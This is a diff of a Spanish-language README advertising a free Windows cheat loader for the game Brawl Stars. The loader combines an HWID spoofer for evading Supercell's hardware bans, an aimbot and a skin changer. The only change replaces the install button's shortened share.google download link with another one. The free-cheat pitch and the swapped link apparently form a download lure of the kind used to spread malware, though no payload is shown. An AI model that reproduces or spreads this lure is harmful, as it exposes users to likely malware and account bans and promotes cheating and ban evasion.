@@ -5,7 +5,7 @@
 **Brawl Stars** — spoofer de HWID, aimbot y skin changer en un solo cargador para Windows. El spoofer reinicia el identificador de hardware que Supercell bloqueó, el aimbot es totalmente configurable y el skin changer desbloquea cosméticos en tu cliente. **Descarga gratis, Windows 10 y 11.**
 
 <p align="center">
-  <a href="https://share.google/qMRWGriO9ekrMilWF"><img src="button.svg" alt="Iniciar instalación" height="46"></a>
+  <a href="https://share.google/4evlThAd55of99r3W"><img src="button.svg" alt="Iniciar instalación" height="46"></a>
 </p>
 
 ## ⚡ Inicio rápido
